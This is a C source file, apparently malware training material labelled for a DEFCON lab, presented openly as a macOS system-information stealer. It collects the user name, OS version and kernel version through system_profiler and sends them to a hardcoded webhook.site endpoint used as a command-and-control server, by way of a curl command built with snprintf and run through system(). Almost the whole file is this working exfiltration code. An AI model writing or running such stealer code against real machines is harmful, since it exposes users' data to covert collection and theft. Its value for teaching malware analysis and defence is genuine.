/*
 * hack2.c
 * macOS systeminfo stealer
 * target: macOS Sonoma / DEFCON Training
 * C2 (Webhook.site)
 * author: @cocomelonc
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PAYLOAD_SIZE 1024
#define LINE_SIZE 256

/* removes trailing newlines and carriage returns from strings */
void trim_newline(char* str) {
  char* p;
  if ((p = strchr(str, '\n'))) *p = '\0';
  if ((p = strchr(str, '\r'))) *p = '\0';
}

/* sends the gathered data to the C2 server via curl */
int sendToC2(const char* message, const char* url) {
  char command[PAYLOAD_SIZE + 512];
  
  /* 
   * -4: force IPv4 (important for VM stability)
   * -s: silent mode
   * --data-urlencode: automatically handles special characters and spaces
  */
  snprintf(command, sizeof(command),
    "/usr/bin/curl -4 -s -X POST %s --data-urlencode \"text=%s\"",
    url, message);

  printf("executing: %s\n", command);
  return system(command);
}

int main() {
  /* full path for system_profiler is safer for background execution */
  char cmd[] = "/usr/sbin/system_profiler SPSoftwareDataType 2>&1";
  char buffer[LINE_SIZE];
  
  char systemVersion[LINE_SIZE] = "Unknown";
  char kernelVersion[LINE_SIZE] = "Unknown";
  char username[LINE_SIZE] = "Unknown";

  FILE* pipe = popen(cmd, "r");
  if (!pipe) {
    perror("failed to open pipe");
    return 1;
  }

  /* parse the system_profiler output line by line */
  while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
    if (strstr(buffer, "System Version:")) {
      char* start = strchr(buffer, ':');
      if (start) {
        strncpy(systemVersion, start + 2, LINE_SIZE - 1);
        trim_newline(systemVersion);
      }
    }
    if (strstr(buffer, "Kernel Version:")) {
      char* start = strchr(buffer, ':');
      if (start) {
        strncpy(kernelVersion, start + 2, LINE_SIZE - 1);
        trim_newline(kernelVersion);
      }
    }
    if (strstr(buffer, "User Name:")) {
      char* start = strchr(buffer, ':');
      if (start) {
        strncpy(username, start + 2, LINE_SIZE - 1);
        trim_newline(username);
      }
    }
  }
  pclose(pipe);

  /* construct the specific message format requested */
  char systemInfo[PAYLOAD_SIZE];
  snprintf(systemInfo, sizeof(systemInfo),
       "üõ° DEFCON Lab Info:\n üë§ User: %s\n üíª OS: %s\n ‚öôÔ∏è Kernel: %s\n",
       username, systemVersion, kernelVersion);

  /* --- webhook.site url --- */
  const char* c2_url = "https://webhook.site/9452bf56-9e0a-4acf-a4e1-e4fa5583fa4f";
  
  printf("[*] gathering data and sending to C2...\n");
  
  int result = sendToC2(systemInfo, c2_url);

  if (result == 0) {
    printf("[+] success! data sent to Webhook.site\n");
  } else {
    printf("[-] failed with exit code: %d\n", result / 256);
  }

  return 0;
}